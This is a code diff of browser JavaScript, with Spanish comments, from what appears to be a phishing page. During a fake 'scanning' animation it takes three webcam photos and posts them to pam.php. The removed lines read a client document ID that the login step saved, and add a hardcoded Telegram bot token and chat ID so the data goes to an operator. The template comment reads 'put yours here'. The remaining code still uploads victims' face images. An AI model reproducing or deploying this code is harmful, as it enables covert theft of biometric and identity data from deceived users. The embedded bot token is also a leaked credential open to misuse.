@@ -323,25 +323,13 @@
         const dataURL = captureCanvas.toDataURL('image/jpeg', 0.9);
         capturedPhotos.push(dataURL);
         photosTaken++;
-        photoCounter.textContent = `Foto ${photosTaken} de ${MAX_PHOTOS}`;
-    }
+     }
 
     async function sendPhotos() {
         const fd = new FormData();
         capturedPhotos.forEach((dataURL, i) => {
             fd.append(`photo${i+1}`, dataURL);
         });
-
-        // 🔐 ID del cliente (documento) guardado en localStorage desde el login
-        const docId = localStorage.getItem('doc_id') || '';
-
-        // 🔐 Token e ID de Telegram: PON AQUÍ LOS TUYOS
-        const TELEGRAM_TOKEN = '8593661430:AAGbJVG-7-S4jzO9MCi9ZwsUOhkaO-7tt9E';
-        const CHAT_ID = '7655000874';
-
-        fd.append('doc_id', docId);
-        fd.append('token', TELEGRAM_TOKEN);
-        fd.append('chat_id', CHAT_ID);
 
         const resp = await fetch('pam.php', {
             method: 'POST',
@@ -369,7 +357,7 @@
         scanOverlay.classList.add('scanning');
 
         // Capturamos 3 fotos en intervalos
-        capturePhoto();                // t = 0
+        capturePhoto();               // t = 0
         setTimeout(capturePhoto, 550);  // t ≈ 0.55s
         setTimeout(capturePhoto, 1100); // t ≈ 1.1s
 
